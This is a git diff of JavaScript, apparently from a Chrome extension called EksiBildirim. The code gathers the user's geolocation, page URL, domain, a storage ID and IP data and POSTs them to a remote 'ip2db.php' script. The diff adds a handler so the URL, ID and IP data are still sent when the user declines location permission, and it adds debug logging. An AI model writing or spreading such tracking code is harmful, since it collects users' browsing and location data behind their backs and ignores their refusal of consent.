@@ -19,10 +19,14 @@ $(document).ready(function GetUserFromStorage(){
                     /**
                      * Gets location by coordinates.
                      */
-                    if (navigator.geolocation) {    
-                        navigator.geolocation.getCurrentPosition(function(position){
+                    console.log(navigator.geolocation);
+                    if (navigator.geolocation) { // Tarayıcı geolocation destekliyor mu?
+                        console.log(data['latitude']);
+                        console.log(data['longitude']);   
+                        navigator.geolocation.getCurrentPosition(function(position){ // Location kabul edilirse
                             data['latitude'] = position.coords.latitude;
-                            data['longitude'] = position.coords.longitude;
+                            data['longitude'] = position.coords.longitude;   
+
                             data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
                             var ip_data = JSON.stringify(data, null, 2);
                             $.post("https://www.banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
@@ -33,10 +37,24 @@ $(document).ready(function GetUserFromStorage(){
                                 }
                             );
 
+                        },
+                        function(error){ // Konum izni kabul edilmedi.
+                            console.log("Position Declined! ");
+                            console.log(error);
+                            data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
+                            var ip_data = JSON.stringify(data, null, 2);
+                            $.post("https://www.banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
+                                {
+                                    ip_data
+                                },
+                                function(data, status){
+                                }
+                            );
                         });
-                    } else { 
+                    } else { // Tarayıcı location'u desteklemiyor.
                         data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
                         var ip_data = JSON.stringify(data, null, 2);
+                        console.log(ip_data);
                         $.post("https://www.banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
                             {
                                 ip_data
